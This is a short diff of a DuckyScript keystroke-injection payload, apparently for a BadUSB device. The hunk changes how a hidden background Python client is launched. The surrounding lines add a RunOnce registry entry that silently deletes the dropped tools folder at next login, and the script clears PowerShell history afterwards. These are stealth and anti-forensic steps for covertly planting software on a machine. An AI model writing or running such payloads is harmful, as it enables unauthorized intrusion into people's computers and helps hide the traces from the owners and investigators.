@@ -23,7 +23,7 @@ STRINGLN $deleteCommand = "powershell -w h -c `"Remove-Item -Path '$tools' -Recu
 STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "login" -Value $deleteCommand
 
 REM Start the program in the background
-STRINGLN & "$tools\launch.bat"
+STRINGLN & "$tools\python\pythonw.exe" "$tools\client\main.py"
 
 REM Cleanup tasks and exit
 STRINGLN Clear-History
